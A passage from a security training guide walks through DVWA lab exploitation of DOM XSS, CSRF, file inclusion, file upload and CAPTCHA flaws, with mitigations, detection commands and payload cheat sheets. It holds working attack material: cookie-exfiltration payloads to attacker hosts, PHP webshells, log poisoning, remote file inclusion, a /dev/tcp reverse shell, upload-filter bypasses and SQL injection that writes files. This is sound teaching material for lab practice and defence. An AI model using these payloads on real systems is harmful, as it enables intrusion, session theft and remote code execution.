DOM-based XSS is the most subtle XSS variant. Unlike reflected or stored XSS, the payload **never touches the server** — it flows entirely within the browser's JavaScript engine.

**The flow:**
```
Source (attacker-controlled input) → JavaScript code → Sink (dangerous function)
```

**Common Sources:** `document.URL`, `location.hash`, `location.search`, `document.referrer`, `window.name`

**Common Sinks (dangerous functions):**
| Sink | Risk |
|---|---|
| `eval()` | Executes arbitrary JavaScript |
| `innerHTML` | Injects HTML + scripts |
| `document.write()` | Writes to DOM |
| `location.href` | Redirects (open redirect + more) |
| `jQuery.html()` | Injects HTML |
| `setTimeout(string)` | Executes string as code |

Because the payload doesn't hit the server, **server-side WAFs and logs are blind to DOM XSS.**

### Why DVWA Is Vulnerable

```javascript
// DVWA Low — xss_d source (simplified)
// The page reads document.location.search and injects it into innerHTML:
var lang = document.location.search.substring(1);  // Gets ?English
document.querySelector('select').innerHTML = "<option>" + lang + "</option>";
// Input URL: ?<img src=x onerror=alert(1)>
// innerHTML assignment executes the payload in the browser — server never saw it
```

### DVWA Walkthrough

**Level: LOW — Direct innerHTML sink**

```bash
# Modify the URL directly in the browser address bar:
http://localhost:8080/dvwa/vulnerabilities/xss_d/?default=<script>alert(1)</script>

# The <script> tag may not fire in innerHTML — use event handlers instead:
http://localhost:8080/dvwa/vulnerabilities/xss_d/?default=<img src=x onerror=alert(document.cookie)>

# If the page uses document.write():
http://localhost:8080/dvwa/vulnerabilities/xss_d/?default=<script>alert(1)</script>

# Cookie exfiltration:
http://localhost:8080/dvwa/vulnerabilities/xss_d/?default=<img src=x onerror="document.location='http://<attacker>:8000/?c='+document.cookie">
```

**Level: MEDIUM — Server-side strip of `<script>`**

Because the request goes through the server before the DOM code executes:

```bash
# Use non-script event handlers:
http://localhost:8080/dvwa/vulnerabilities/xss_d/?default=<img src=x onerror=alert(1)>

# Hash fragment (never sent to server at all!):
http://localhost:8080/dvwa/vulnerabilities/xss_d/#<script>alert(1)</script>
# Check if the JavaScript reads location.hash — if so, server filtering is irrelevant
```

**Level: HIGH — Strict whitelist of allowed options**

```bash
# Source enforces only: English, French, Spanish, German
# Look for a second code path — check if there's a hash-based sink the whitelist doesn't cover:
http://localhost:8080/dvwa/vulnerabilities/xss_d/?default=English#<script>alert(1)</script>
# The ?default is whitelisted; the #fragment is not validated and may hit a DOM sink
```

**Finding DOM XSS manually:**
```bash
# Use browser DevTools → Sources → search for:
# innerHTML, outerHTML, document.write, eval, setTimeout, location.href, jQuery .html(

# Use DOM Invader (built into Burp Suite browser):
# Open Burp's built-in browser → Extensions → DOM Invader → enable
# Automatically tracks sources and sinks, highlights injection points
```

### Purple Team

**Detection:** CSP reporting; browser-side XSS auditors (Chrome deprecated these — use Trusted Types API instead).

**Mitigation:**
- Avoid dangerous sinks — use `textContent` instead of `innerHTML`
- **Trusted Types API** (Chrome/Edge): enforces that only explicitly created Trusted Type objects can be assigned to dangerous sinks
- `DOMPurify.sanitize()` before any innerHTML assignment
- CSP `require-trusted-types-for 'script'`
- Code review: audit all JavaScript files for sink/source patterns

### References

1. OWASP — DOM-based XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
2. PortSwigger — DOM-based XSS: https://portswigger.net/web-security/cross-site-scripting/dom-based
3. Google — Trusted Types: https://developer.chrome.com/docs/web-platform/trusted-types

---

---

# 9. CSRF

**OWASP A01:2025** — Broken Access Control
**CWE-352** — Cross-Site Request Forgery
**Real-world CVEs:** CVE-2020-17519 (Apache Flink CSRF), CVE-2022-0739 (WordPress CSRF → admin takeover)

---

### Theory

CSRF tricks a victim's **already-authenticated browser** into making an unwanted request to a web application. The server sees the request as legitimate because it carries the victim's real session cookie — the browser attaches it automatically.

**The CSRF triangle:**
1. Victim is logged into `bank.com` — their browser holds a valid session cookie
2. Victim visits attacker-controlled `evil.com` while still logged in
3. `evil.com` contains a hidden form or image tag that sends a request to `bank.com`
4. Victim's browser sends the request, including the bank cookie
5. Bank processes it as a legitimate action by the victim

Unlike XSS (which runs in the victim's browser on the legitimate site), CSRF **forges a request from outside** the legitimate site.

### Why DVWA Is Vulnerable

```php
// DVWA Low — csrf/source/low.php
// Password change endpoint — accepts POST with no anti-CSRF token:
$pass_new  = $_GET['password_new'];
$pass_conf = $_GET['password_conf'];
// No token validation. Any site can trigger this with an <img> or <form>.
```

### DVWA Walkthrough

**Level: LOW — No token, GET-based password change**

```bash
# The password change URL (GET-based — trivially exploitable):
http://localhost:8080/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change

# Create an evil HTML page on your attacker machine:
cat > /tmp/evil.html << 'EOF'
<!DOCTYPE html>
<html>
<body>
  <h1>You won a prize! Loading...</h1>
  <!-- Invisible iframe triggers the CSRF request when victim loads this page -->
  <img src="http://localhost:8080/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change"
       width="0" height="0">
</body>
</html>
EOF

# Serve it:
python3 -m http.server 8000 --directory /tmp

# If victim is logged into DVWA and visits http://<attacker>:8000/evil.html,
# their DVWA password is changed to 'hacked' — without their knowledge.
```

**Level: MEDIUM — Referer header check**

```bash
# Server checks that Referer contains the DVWA host.
# Bypass: host the attack page on a subdomain or path that contains the target hostname:
# Create a directory named after the target:
mkdir -p /tmp/192.168.56.20
cp /tmp/evil.html /tmp/192.168.56.20/evil.html
# Serve at: http://<attacker>:8000/192.168.56.20/evil.html
# Referer header: http://<attacker>:8000/192.168.56.20/evil.html
# Server's referer check: "does referer contain '192.168.56.20'?" → YES

# Alternative: null Referer bypass
# Some browsers send no Referer from data: URIs or sandboxed iframes:
<iframe sandbox="allow-scripts allow-forms" src="data:text/html,<form action='http://target/...' method='GET'><script>document.forms[0].submit()</script></form>"></iframe>
```

**Level: HIGH — Proper CSRF token**

DVWA High embeds a per-session, per-request token. To bypass:
1. **XSS + CSRF chaining** — if the same domain has an XSS vulnerability, use it to steal the token and submit the form:
```javascript
// XSS payload that performs CSRF:
var xhr = new XMLHttpRequest();
xhr.open('GET', '/dvwa/vulnerabilities/csrf/', false);
xhr.send();
var token = xhr.responseText.match(/user_token.*?value='([^']+)'/)[1];
// Then submit the form with the stolen token
```

### Purple Team

**Detection:** Requests to state-changing endpoints from unexpected Referer origins; absence of expected CSRF token.

**Mitigation:**
- **Synchronizer Token Pattern** — generate unique per-session, per-request token; validate on every state-changing request
- **SameSite cookie attribute** — `SameSite=Strict` or `SameSite=Lax` prevents cookies from being sent with cross-origin requests (most modern CSRF protection)
- Double Submit Cookie pattern
- `Content-Type: application/json` enforcement (prevents simple CSRF forms)
- `Origin` / `Referer` header validation as defense-in-depth

### References

1. OWASP — CSRF Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
2. OWASP — Testing for CSRF (WSTG-SESS-05): https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery
3. PortSwigger — CSRF: https://portswigger.net/web-security/csrf

---

---

# 10. File Inclusion

**OWASP A05:2025** — Security Misconfiguration
**CWE-98** — Improper Control of Filename for Include/Require Statement (PHP)
**Real-world CVEs:** CVE-2021-41773 (Apache path traversal to RCE), CVE-2020-7961 (Liferay LFI → RCE), CVE-2018-7600 (Drupalgeddon2)

---

### Theory

File Inclusion vulnerabilities occur when user-controlled input determines which file is loaded (included) by the application. Two variants:

- **LFI (Local File Inclusion):** The included file is read from the **local filesystem** — read `/etc/passwd`, web app config, SSH keys, log files
- **RFI (Remote File Inclusion):** The application fetches and **executes** a file from a remote URL — instant RCE. Requires PHP `allow_url_include=On` (off by default in modern PHP)

**LFI escalation path:**
```
Read /etc/passwd → identify users → 
LFI + Log Poisoning → write PHP to Apache log → include the log → RCE
```

### Why DVWA Is Vulnerable

```php
// DVWA Low — fi/index.php
$file = $_GET['page'];
include($file);
// Input: ?page=/etc/passwd  → reads /etc/passwd
// Input: ?page=http://attacker/shell.php  → downloads + executes PHP (RFI)
```

### DVWA Walkthrough

**Level: LOW — No filtering**

```bash
# LFI — read system files:
curl "http://localhost:8080/dvwa/vulnerabilities/fi/?page=/etc/passwd" \
  -b "PHPSESSID=<session>;security=low"

# Read PHP source (base64-encode to avoid execution):
curl "http://localhost:8080/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../fi/index.php" \
  -b "PHPSESSID=<session>;security=low" | grep -o "eyJ[^<]*" | base64 -d

# Read application config:
curl "http://localhost:8080/dvwa/vulnerabilities/fi/?page=../../config/config.inc.php" \
  -b "PHPSESSID=<session>;security=low"

# LFI via Log Poisoning → RCE:
# Step 1: Poison the Apache access log with PHP code via User-Agent:
curl "http://localhost:8080/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
# Step 2: Include the log file:
curl "http://localhost:8080/dvwa/vulnerabilities/fi/?page=/var/log/apache2/access.log&cmd=id" \
  -b "PHPSESSID=<session>;security=low"
# Output: uid=33(www-data)...

# RFI (if allow_url_include=On):
# Step 1: Create a PHP webshell:
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
# Step 2: Serve it:
python3 -m http.server 8000 --directory /tmp
# Step 3: Include remotely:
curl "http://localhost:8080/dvwa/vulnerabilities/fi/?page=http://<attacker_ip>:8000/shell.php&cmd=id" \
  -b "PHPSESSID=<session>;security=low"
```

**Level: MEDIUM — Strips `../` and `http://`**

```bash
# Path traversal bypass — double-encode:
# ../ → ..././  (stripped ../ leaves ../)
# or URL-encode: %2e%2e%2f
curl "http://localhost:8080/dvwa/vulnerabilities/fi/?page=..././..././..././etc/passwd" \
  -b "PHPSESSID=<session>;security=medium"

# Null byte bypass (PHP < 5.3.4):
curl "http://localhost:8080/dvwa/vulnerabilities/fi/?page=../../../etc/passwd%00" \
  -b "PHPSESSID=<session>;security=medium"

# RFI bypass — use https:// or ftp://:
curl "http://localhost:8080/dvwa/vulnerabilities/fi/?page=hthttp://tp://<attacker>/shell.php" \
  -b "PHPSESSID=<session>;security=medium"
```

**Level: HIGH — Enforces known filenames**

```bash
# Source uses fnmatch() to require filename starts with "file"
# Bypass: use file:// wrapper (it starts with "file"):
curl "http://localhost:8080/dvwa/vulnerabilities/fi/?page=file:///etc/passwd" \
  -b "PHPSESSID=<session>;security=high"
```

### Purple Team

**Detection:**
```bash
# Path traversal patterns in logs:
grep -E "(\.\./|%2e%2e|etc/passwd|/proc/self|php://)" /var/log/apache2/access.log
```

**Mitigation:**
- Never pass user input to `include()`, `require()`, `fopen()` directly
- Use a whitelist of allowed files/templates: `$allowed = ['about', 'contact']; if(!in_array($file, $allowed)) die();`
- `open_basedir` PHP setting restricts accessible directories
- Disable `allow_url_include` and `allow_url_fopen`
- Move template files outside the web root

### References

1. OWASP — Testing for LFI (WSTG-INPV-11): https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_File_Inclusion
2. OWASP — Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal
3. PortSwigger — File Path Traversal: https://portswigger.net/web-security/file-path-traversal

---

---

# 11. File Upload

**OWASP A04:2025** — Insecure Design
**CWE-434** — Unrestricted Upload of File with Dangerous Type
**Real-world CVEs:** CVE-2021-24507 (WordPress plugin unrestricted upload → RCE), CVE-2020-35489 (Contact Form 7 WordPress bypass), CVE-2022-0739 (WordPress file upload chain)

---

### Theory

Unrestricted file upload vulnerabilities allow an attacker to upload executable code (PHP, JSP, ASPX) to the server, then browse to the uploaded file to execute it. This gives **direct RCE** on the web server.

**Defense bypass strategies:**
| Defense | Bypass |
|---|---|
| Extension blacklist (`.php`) | Use `.php5`, `.phtml`, `.pHp`, `.php.jpg` |
| Extension whitelist (`.jpg`) | Null byte: `shell.php%00.jpg` (old PHP) |
| MIME type check (client header) | Change `Content-Type` header with Burp |
| Image content check | Embed PHP in a valid image (polyglot file) |
| Magic bytes check | Prepend `GIF89a` before PHP code |

### Why DVWA Is Vulnerable

```php
// DVWA Low — upload/source/low.php
move_uploaded_file($_FILES['uploaded']['tmp_name'], $target);
// No validation. Any file type. Upload shell.php → browse to it → RCE.
```

### DVWA Walkthrough

**Level: LOW — No validation at all**

```bash
# Create a PHP webshell:
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload via curl:
curl -s -b "PHPSESSID=<session>;security=low" \
  -F "uploaded=@shell.php;type=application/x-php" \
  -F "Upload=Upload" \
  "http://localhost:8080/dvwa/vulnerabilities/upload/"

# Note the upload path from the response (usually: ../../hackable/uploads/shell.php)
# Access the shell:
curl "http://localhost:8080/dvwa/hackable/uploads/shell.php?cmd=id"
curl "http://localhost:8080/dvwa/hackable/uploads/shell.php?cmd=cat%20/etc/passwd"

# Upgrade to reverse shell:
# cmd payload:
bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'
# URL-encoded:
curl "http://localhost:8080/dvwa/hackable/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<attacker_ip>/4444+0>%261'"
```

**Level: MEDIUM — MIME type check (`image/jpeg` or `image/png` required)**

```bash
# The check is only on Content-Type header — trivially spoofed with Burp:
curl -s -b "PHPSESSID=<session>;security=medium" \
  -F "uploaded=@shell.php;type=image/jpeg" \     # ← spoof MIME type
  -F "Upload=Upload" \
  "http://localhost:8080/dvwa/vulnerabilities/upload/"
# Server accepts it because Content-Type says image/jpeg.

# Burp method: Intercept upload → change Content-Type in multipart header to image/jpeg
```

**Level: HIGH — Server-side image validation (getimagesize)**

The server actually reads the file to verify it's an image. **Polyglot file** attack:

```bash
# Method 1: Prepend image magic bytes to PHP code
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php.gif

# Upload with .php.gif extension and spoof Content-Type:
curl -s -b "PHPSESSID=<session>;security=high" \
  -F "uploaded=@shell.php.gif;type=image/gif" \
  -F "Upload=Upload" \
  "http://localhost:8080/dvwa/vulnerabilities/upload/"

# Method 2: Embed in a real image's EXIF data:
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legit.jpg -o shell.jpg

# The file passes getimagesize() because it IS a valid JPEG.
# Then use File Inclusion vulnerability to execute it:
curl "http://localhost:8080/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/shell.jpg&cmd=id" \
  -b "PHPSESSID=<session>;security=low"
# Combine File Upload (High) + File Inclusion (Low) for full chain
```

### Purple Team

**Detection:**
```bash
# Monitor upload directories for executable files:
find /var/www/html -name "*.php" -newer /var/www/html/index.php
# Inotify watch on upload directory:
inotifywait -m /var/www/html/dvwa/hackable/uploads/ -e create
```

**Mitigation:**
- Store uploads **outside the web root** (no direct URL access)
- Rename files on upload (random name, no original extension)
- Use OS-level type detection (`finfo_file()` in PHP, `file` command)
- Serve uploads through a controller that sets `Content-Type: application/octet-stream`
- Strip EXIF/metadata from images (`exiftool -all= file.jpg`)
- Never allow execution of files in the upload directory (Apache: `php_admin_flag engine off` in upload directory's `.htaccess`)

### References

1. OWASP — Unrestricted File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
2. OWASP — File Upload Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
3. PortSwigger — File Upload Vulnerabilities: https://portswigger.net/web-security/file-upload

---

---

# 12. Insecure CAPTCHA

**OWASP A07:2025** — Identification and Authentication Failures
**CWE-804** — Guessable CAPTCHA
**Context:** Not a standalone OWASP category — it's an authentication bypass that enables brute force

---

### Theory

CAPTCHA should distinguish humans from bots. Insecure CAPTCHA implementations can be bypassed by:
1. **Client-side validation only** — CAPTCHA checked in JavaScript, easily disabled or bypassed
2. **Predictable/reusable tokens** — reCAPTCHA token not verified server-side, or verified only once and reused
3. **Logic flaw** — the success/failure of CAPTCHA validation doesn't actually gate the protected action
4. **Step parameter manipulation** — multi-step CAPTCHA processes with manipulatable step counters

### DVWA Walkthrough

**Level: LOW — CAPTCHA result passed as POST parameter, server trusts it blindly**

```bash
# Intercept the password change request. Notice: recaptcha_response_field=correct
# The server checks this string — not the actual reCAPTCHA API!
# Simply send the expected string:
curl -s -b "PHPSESSID=<session>;security=low" \
  --data "password_new=hacked&password_conf=hacked&recaptcha_response_field=correct&Change=Change" \
  "http://localhost:8080/dvwa/vulnerabilities/captcha/"
```

**Level: MEDIUM — Step-based logic flaw**

```bash
# The flow has two steps. Step 1 validates CAPTCHA. Step 2 changes password.
# Bypass: skip step 1, go directly to step 2 with step=2 in POST:
curl -s -b "PHPSESSID=<session>;security=medium" \
  --data "password_new=hacked&password_conf=hacked&step=2&Change=Change" \
  "http://localhost:8080/dvwa/vulnerabilities/captcha/"
```

**Level: HIGH — Actual reCAPTCHA API used, but...**

```bash
# Look for a hidden parameter — DVWA High passes a "passed" flag
# or the g-recaptcha-response field contains a test key that always passes.
# Intercept with Burp → check what parameters exist → look for bypass flags.
```

### Purple Team

**Mitigation:**
- Verify reCAPTCHA tokens **server-side** against Google's API
- Never trust client-supplied "CAPTCHA passed" flags
- CAPTCHA validation must be an atomic gate — no step skipping
- Implement rate limiting independently of CAPTCHA (defense in depth)

### References

1. OWASP — Testing for Captcha (WSTG-SESS-08): https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/08-Testing_for_Weak_Security_Question_Answer
2. Google reCAPTCHA Server-Side Verification: https://developers.google.com/recaptcha/docs/verify
3. OWASP — Authentication Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html

---

---

# Appendix A — Tool Quick Reference

| Tool | Purpose | Key command pattern |
|---|---|---|
| `hydra` | Credential brute force | `hydra -l USER -P wordlist.txt HOST http-post-form "path:params:fail_string"` |
| `sqlmap` | SQL injection automation | `sqlmap -u "URL" --cookie="..." --dbs` |
| `burpsuite` | Intercept / Intruder / Repeater | Launch: `burpsuite &` |
| `nikto` | Web server vulnerability scan | `nikto -h http://target -C all` |
| `ffuf` | Directory/parameter fuzzing | `ffuf -u http://target/FUZZ -w wordlist.txt -mc 200` |
| `gobuster` | Directory enumeration | `gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt` |
| `exiftool` | EXIF metadata manipulation | `exiftool -Comment='<?php ... ?>' img.jpg` |
| `john` | Password hash cracking | `john hash.txt --format=raw-md5 --wordlist=rockyou.txt` |
| `hashcat` | GPU hash cracking | `hashcat -m 0 hash.txt rockyou.txt` |
| `nc` (netcat) | Catch reverse shells | `nc -lvnp 4444` |
| `beef-xss` | Browser exploitation framework | `beef-xss` → `http://127.0.0.1:3000/ui/panel` |
| `python3 -m http.server` | Quick attacker HTTP server | `python3 -m http.server 8000` |

**Wordlist locations on Kali/ParrotOS:**

```
/usr/share/wordlists/rockyou.txt               # Most common passwords
/usr/share/wordlists/dirb/common.txt           # Directory enumeration
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/                           # SecLists (install: sudo apt install seclists)
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
```

---

# Appendix B — XSS Payload Cheat Sheet

```html
<!-- Basic -->
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

<!-- No <script> tag — event handlers -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>

<!-- JavaScript URI -->
<a href="javascript:alert(1)">click</a>

<!-- Case variation bypass -->
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</sCrIpT>

<!-- Comment/whitespace insertion -->
<scr<!---->ipt>alert(1)</script>
<scr ipt>alert(1)</scr ipt>   <!-- breaks some filters -->

<!-- Encoding bypass -->
<script>eval(atob('YWxlcnQoMSk='))</script>  <!-- base64: alert(1) -->
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>

<!-- Cookie exfiltration -->
<script>document.location='http://ATTACKER:8000/?c='+document.cookie</script>
<img src=x onerror="new Image().src='http://ATTACKER:8000/?c='+document.cookie">
<script>fetch('http://ATTACKER:8000/?c='+document.cookie)</script>

<!-- BeEF hook -->
<script src="http://ATTACKER:3000/hook.js"></script>
```

---

# Appendix C — SQLi Payload Cheat Sheet

```sql
-- Authentication bypass
' OR '1'='1
' OR 1=1--
' OR 1=1#
admin'--
' OR 'x'='x

-- Column count enumeration
ORDER BY 1--
ORDER BY 2--
ORDER BY N--   (increment until error)

-- UNION SELECT (MySQL — 2 columns)
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2--
' UNION SELECT user(),database()--

-- Information schema extraction (MySQL)
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT user,password FROM users--

-- Blind boolean
' AND 1=1--    (TRUE)
' AND 1=2--    (FALSE)
' AND (SELECT SUBSTRING(database(),1,1))='d'--

-- Time-based blind (MySQL)
' AND SLEEP(3)--
' AND IF(1=1,SLEEP(3),0)--
' AND IF((SELECT SUBSTRING(database(),1,1))='d',SLEEP(3),0)--

-- Read files (MySQL with FILE privilege)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--

-- Write files (MySQL)
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--
```

---

# Appendix D — Purple Team Summary Matrix

| Vulnerability | Primary Attack Tool | Key Detection Signal | Core Mitigation |
|---|---|---|---|
| Brute Force | hydra, Burp Intruder | Many 401s from same IP | Account lockout + MFA |
| Weak Session IDs | Burp Sequencer, custom script | Sequential cookie values | CSPRNG session IDs |
| SQL Injection | sqlmap, Burp Repeater | SQL keywords in params | Parameterized queries |
| SQLi Blind | sqlmap -T | Timing anomalies | Parameterized queries |
| Command Injection | Burp Repeater, curl | Shell metachar in params | Never pass input to shell |
| Reflected XSS | XSStrike, Burp | `<script` in URL params | htmlspecialchars() + CSP |
| Stored XSS | Burp, browser | `<script` in POST body | Output encoding + CSP |
| DOM XSS | DOM Invader (Burp) | CSP violations | Avoid innerHTML, Trusted Types |
| CSRF | Browser, curl | No CSRF token validation | SameSite cookie + CSRF token |
| File Inclusion | curl, Burp | `../` in path params | Whitelist allowed files |
| File Upload | curl, Burp | Non-image extension uploaded | Rename + serve outside webroot |
| Insecure CAPTCHA | Burp Repeater | Missing reCAPTCHA validation | Server-side API verification |

---

*NorthStar Security Training Program — "Know the attack. Build the defense."*
*Reference: [Lab 5 — Web Exploitation with DVWA](../lab5/README.md) | [Lab 9 — Operation VAULT BREACH CTF](../lab9/README.md)*
